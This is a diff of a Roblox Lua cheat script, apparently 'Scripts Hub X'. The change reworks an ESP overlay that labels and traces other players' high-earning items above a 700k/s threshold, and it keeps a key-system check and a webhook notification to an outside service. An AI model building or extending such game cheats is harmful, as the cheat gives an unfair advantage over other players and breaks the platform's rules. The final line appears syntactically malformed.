-								nameLabel.BackgroundTransparency = 1
-								nameLabel.Text = displayText
-								nameLabel.TextColor3 = Color3.new(0, 0.5, 1)
-								nameLabel.TextStrokeTransparency = 0
-								nameLabel.TextStrokeColor3 = Color3.new(0, 0.8, 1)
-								nameLabel.TextScaled = true
-								nameLabel.TextSize = 14
-								nameLabel.Font = Enum.Font.SourceSansBold
-								
-								-- Money per second
-								local moneyLabel = Instance.new("TextLabel")
-								moneyLabel.Parent = containerFrame
-								moneyLabel.Size = UDim2.new(1, 0, 0.25, 0)
-								moneyLabel.Position = UDim2.new(0, 0, 0.55, 0)
-								moneyLabel.BackgroundTransparency = 1
-								moneyLabel.Text = updatedData.price or ""
-								moneyLabel.TextColor3 = Color3.new(0, 1, 0)
-								moneyLabel.TextStrokeTransparency = 0
-								moneyLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-								moneyLabel.TextScaled = true
-								moneyLabel.TextSize = 10
-								moneyLabel.Font = Enum.Font.SourceSans
-								
-								-- Rarity
-								local rarityLabel = Instance.new("TextLabel")
-								rarityLabel.Parent = containerFrame
-								rarityLabel.Size = UDim2.new(1, 0, 0.2, 0)
-								rarityLabel.Position = UDim2.new(0, 0, 0.8, 0)
-								rarityLabel.BackgroundTransparency = 1
-								rarityLabel.Text = updatedData.rarity or ""
-								rarityLabel.TextScaled = true
-								rarityLabel.TextSize = 8
-								rarityLabel.Font = Enum.Font.SourceSans
-								
-								-- Special rarity colors
-								if updatedData.rarity == "Secret" then
-									rarityLabel.TextColor3 = Color3.new(0, 0, 0)
-									rarityLabel.TextStrokeTransparency = 0
-									rarityLabel.TextStrokeColor3 = Color3.new(1, 1, 1)
-								elseif updatedData.rarity == "Brainrot God" then
-									spawn(function()
-										local hue = 0
-										while rarityLabel and rarityLabel.Parent do
-											hue = (hue + 0.01) % 1
-											rarityLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
-											wait(0.1)
-										end
-									end)
-									rarityLabel.TextStrokeTransparency = 0
-									rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-								else
-									rarityLabel.TextColor3 = Color3.new(1, 1, 1)
-									rarityLabel.TextStrokeTransparency = 0
-									rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+								-- Recreate ESP labels with updated data
+								if espContainer.nameLabel then
+									espContainer.nameLabel:Destroy()
+									
+									-- Recreate the billboard with updated information
+									local billboardGui = Instance.new("BillboardGui")
+									billboardGui.Parent = espContainer.object
+									billboardGui.Size = UDim2.new(0, 200, 0, 90)
+									billboardGui.StudsOffset = Vector3.new(0, 8, 0)
+									billboardGui.AlwaysOnTop = true
+									
+									local containerFrame = Instance.new("Frame")
+									containerFrame.Parent = billboardGui
+									containerFrame.Size = UDim2.new(1, 0, 1, 0)
+									containerFrame.BackgroundTransparency = 1
+									
+									-- Mutation label
+									local mutationLabel = Instance.new("TextLabel")
+									mutationLabel.Parent = containerFrame
+									mutationLabel.Size = UDim2.new(1, 0, 0.15, 0)
+									mutationLabel.Position = UDim2.new(0, 0, 0, 0)
+									mutationLabel.BackgroundTransparency = 1
+									mutationLabel.Text = updatedData.mutation or ""
+									mutationLabel.TextColor3 = Color3.new(1, 1, 1)
+									mutationLabel.TextStrokeTransparency = 0
+									mutationLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+									mutationLabel.TextScaled = true
+									mutationLabel.TextSize = 8
+									mutationLabel.Font = Enum.Font.SourceSans
+									
+									-- Name label
+									local nameLabel = Instance.new("TextLabel")
+									nameLabel.Parent = containerFrame
+									nameLabel.Size = UDim2.new(1, 0, 0.35, 0)
+									nameLabel.Position = UDim2.new(0, 0, 0.15, 0)
+									nameLabel.BackgroundTransparency = 1
+									nameLabel.Text = "HIGH GEN BRAINROT"
+									nameLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+									nameLabel.TextStrokeTransparency = 0
+									nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+									nameLabel.TextScaled = true
+									nameLabel.TextSize = 16
+									nameLabel.Font = Enum.Font.SourceSansBold
+									
+									-- Generation label
+									local generationLabel = Instance.new("TextLabel")
+									generationLabel.Parent = containerFrame
+									generationLabel.Size = UDim2.new(1, 0, 0.25, 0)
+									generationLabel.Position = UDim2.new(0, 0, 0.5, 0)
+									generationLabel.BackgroundTransparency = 1
+									generationLabel.Text = updatedData.price or ""
+									generationLabel.TextColor3 = Color3.new(0, 1, 0)
+									generationLabel.TextStrokeTransparency = 0
+									generationLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+									generationLabel.TextScaled = true
+									generationLabel.TextSize = 12
+									generationLabel.Font = Enum.Font.SourceSansBold
+									
+									-- Rarity label
+									local rarityLabel = Instance.new("TextLabel")
+									rarityLabel.Parent = containerFrame
+									rarityLabel.Size = UDim2.new(1, 0, 0.15, 0)
+									rarityLabel.Position = UDim2.new(0, 0, 0.75, 0)
+									rarityLabel.BackgroundTransparency = 1
+									rarityLabel.Text = updatedData.rarity or ""
+									rarityLabel.TextScaled = true
+									rarityLabel.TextSize = 8
+									rarityLabel.Font = Enum.Font.SourceSans
+									
+									-- Special rarity colors
+									if updatedData.rarity == "Secret" then
+										rarityLabel.TextColor3 = Color3.new(0, 0, 0)
+										rarityLabel.TextStrokeTransparency = 0
+										rarityLabel.TextStrokeColor3 = Color3.new(1, 1, 1)
+									elseif updatedData.rarity == "Brainrot God" then
+										spawn(function()
+											local hue = 0
+											while rarityLabel and rarityLabel.Parent do
+												hue = (hue + 0.01) % 1
+												rarityLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
+												wait(0.1)
+											end
+										end)
+										rarityLabel.TextStrokeTransparency = 0
+										rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+									else
+										rarityLabel.TextColor3 = Color3.new(1, 1, 1)
+										rarityLabel.TextStrokeTransparency = 0
+										rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+									end
+									
+									espContainer.nameLabel = billboardGui
 								end
-								
-								espContainer.nameLabel = billboardGui
+							elseif updatedData and updatedData.priceValue < MIN_GENERATION_THRESHOLD then
+								-- Remove ESP if generation dropped below threshold
+								if espContainer.highlight then
+									espContainer.highlight:Destroy()
+								end
+								if espContainer.nameLabel then
+									espContainer.nameLabel:Destroy()
+								end
+								if espContainer.tracer then
+									if espContainer.tracer.beam then
+										espContainer.tracer.beam:Destroy()
+									end
+									if espContainer.tracer.attachment0 then
+										espContainer.tracer.attachment0:Destroy()
+									end
+									if espContainer.tracer.attachment1 then
+										espContainer.tracer.attachment1:Destroy()
+									end
+								end
+								espObjects[espId] = nil
+								print("🔻 Removed ESP for brainrot that dropped below 700k/s threshold")
 							end
 						end
 					end
 				end
 			end
 		end)
+		
+		-- Also monitor for plot changes (new plots being added)
+		local plots = workspace:FindFirstChild("Plots")
+		if plots then
+			plots.ChildAdded:Connect(function(child)
+				if child:IsA("Model") or child:IsA("Folder") then
+					task.wait(3) -- Wait for plot to fully load
+					checkForHighGenerationAnimals()
+				end
+			end)
+		else
+			-- Wait for Plots folder to be created
+			workspace.ChildAdded:Connect(function(child)
+				if child.Name == "Plots" then
+					child.ChildAdded:Connect(function(plot)
+						if plot:IsA("Model") or plot:IsA("Folder") then
+							task.wait(3)
+							checkForHighGenerationAnimals()
+						end
+					end)
+				end
+			end)
+		end
+		
+		print("✅ High-Generation Brainrot Logger initialized successfully")
 	end
 end
 
 -- ================================
--- MAIN EXECUTION WITH ENHANCED KEY SYSTEM LOADER
+-- MAIN EXECUTION WITH ENHANCED GENERATION-BASED DETECTION
 -- ================================
 
 spawn(function()
-	print("🚀 Starting Scripts Hub X with Enhanced ESP and Randomized Key System...")
+	print("🚀 Starting Scripts Hub X with Enhanced High-Generation ESP (700k/s+) and Randomized Key System...")
 	print("🔧 Key System Status: " .. (Keysystem and "ENABLED" or "DISABLED"))
+	print("?? Generation Threshold: " .. tostring(MIN_GENERATION_THRESHOLD) .. "/s")
 	
 	-- Check user status
 	local userStatus = checkUserStatus()
@@ -1081,8 +1046,8 @@ spawn(function()
 	-- Send webhook notification
 	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
 	
-	-- Initialize Enhanced Animal Logger with ESP (silently)
-	initializeAnimalLogger()
+	-- Initialize Enhanced High-Generation Animal Logger with ESP (silently)
+	initializeHighGenerationAnimalLogger()
 	
 	-- Handle unsupported games
 	if not isSupported then
@@ -1098,11 +1063,13 @@ spawn(function()
 	if success then
 		print("✅ Scripts Hub X | Complete for " .. userStatus .. " user")
 		if userStatus == "regular-keyed" then
-			notify("Scripts Hub X", "✅ Key verified with randomized API! Script loaded successfully.")
+		    print("Scripts Hub X", "✅ Key verified with randomized API! High-Gen Detection active.")
 		elseif userStatus == "regular-bypassed" then
-			notify("Scripts Hub X", "✅ Script loaded successfully (Key system bypassed).")
+			print("Scripts Hub X", "✅ High-Generation Detection active (Key system bypassed).")
+		else
+			print("Scripts Hub X", "✅ High-Generation Detection active.")
 		end
 	else
 		print("❌ Script failed to load: " .. tostring(errorMsg))
 	end
-end)
+end))
